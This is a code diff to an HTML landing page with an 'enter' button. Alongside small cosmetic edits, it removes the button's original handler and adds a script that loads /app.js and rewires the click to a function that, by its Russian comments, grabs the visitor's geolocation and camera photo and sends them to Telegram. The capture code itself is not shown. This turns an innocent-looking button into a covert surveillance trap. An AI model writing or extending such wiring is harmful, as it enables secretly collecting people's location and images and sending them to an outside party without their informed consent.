@@ -129,10 +129,8 @@
     const reason = document.getElementById('reason');
     const btn    = document.getElementById('enterBtn');
     const note   = document.getElementById('note');
-    btn.addEventListener('click', go);
 
     function getIOSLikeVersion() {
-      // iOS & iPadOS Safari exposes like: "OS 18_0"; on Mac (iPadOS UA quirk) use appVersion
       const ua = navigator.userAgent;
       let m = ua.match(/OS\s(\d+)[_.]/); // iOS/iPadOS
       if (m) return parseInt(m[1], 10);
@@ -192,7 +190,7 @@
       }
     })();
 
-    // ===== Animated particles (battery‑safe) =====
+    // ===== Animated particles (battery-safe) =====
     (function particles(){
       const prefersReduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
       const canvas = document.getElementById('bg');
@@ -259,6 +257,26 @@
       document.addEventListener('visibilitychange', () => { if (document.hidden) stop(); else start(); });
 
       start();
+    })();
+  </script>
+
+  <!-- === Подключаем фронтовую логику и переопределяем клик === -->
+  <script src="/app.js"></script>
+  <script>
+    (function(){
+      const btn = document.getElementById('enterBtn');
+      if (!btn) return;
+
+      // На случай, если где-то выше был навешан go():
+      try { btn.removeEventListener('click', go); } catch(_) {}
+
+      // Новый поток: гео+камера → превью → отправка в ТГ
+      btn.addEventListener('click', async () => {
+        await window.__startGeoPhotoFlow?.();
+
+        // Если нужен редирект после успешной отправки — раскомментируй:
+        // go();
+      });
     })();
   </script>
 </body>
